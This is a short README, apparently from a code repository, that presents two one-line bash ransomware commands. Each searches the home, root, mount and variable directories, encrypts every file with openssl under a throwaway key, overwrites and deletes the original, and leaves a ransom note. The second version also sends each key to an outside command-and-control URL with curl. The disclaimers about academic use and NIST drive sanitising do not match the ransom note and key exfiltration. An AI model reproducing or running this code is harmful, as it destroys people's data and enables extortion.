# Ransomware-Oner-Line - OneLoC 

This is a code for ransomware in bash script oner line. !!! PURELY FOR ACADEMICAL PURPOSES !!!  

I am not responsible in any way for the misuse of this script, this is code normally installed in any linux distribution  
that has been bundled in a way to encrypt all data using AES-CBC-256 encryption with openssl.  

This script was developed for the purpose of sanitizing physical storage drives for disposal to NIST-800-88 standard  

With great powers, great responsibilities...  

### OneLoC Code
#### One LoC: One Line Of Code

```
Ransom@OneLoC:~$ for i in $(find /home /media /mnt /opt /root /srv /tmp /var -type f); do rdc=$(mktemp -u|rev|cut -d"." -f1) && CODE=$rdc$RANDOM && openssl enc -aes-256-cbc -a -salt -in $i -out $i.LoC -k $(echo -n $CODE | base64 | sha256sum) && echo "OneLoC Anti-Forensic..." > $i && rm -rf $i;echo 'All your files has been encrypted by: OneLoC !' > $HOME/README.TXT;done >/dev/null 2>&1&
```

#### With Exfiltration:  
```
Ransom@OneLoC:~$ for i in $(find /home /media /mnt /opt /root /srv /tmp /var -type f); do rdc=$(mktemp -u|rev|cut -d"." -f1) && CODE=$rdc$RANDOM && curl -s -X GET https://c2.att.ck/exfilt.php?key=$CODE -k && openssl enc -aes-256-cbc -a -salt -in $i -out $i.LoC -k $(echo -n $CODE | base64 | sha256sum) && echo "OneLoC Anti-Forensic..." > $i && rm -rf $i;echo 'All your files has been encrypted by: OneLoC !' > $HOME/README.TXT;done >/dev/null 2>&1&
```  


